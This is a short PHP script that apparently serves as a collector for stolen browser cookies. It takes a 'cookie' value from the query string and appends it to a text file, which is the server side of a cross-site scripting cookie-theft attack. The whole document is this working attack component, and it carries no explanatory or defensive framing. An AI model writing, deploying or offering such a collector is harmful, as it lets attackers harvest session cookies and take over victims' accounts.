<?php
$cookie=$_GET['cookie'];
$log=fopen("cookie.txt","a");
Fwrite($log,$cookie."\n");
Fclose($log);
?>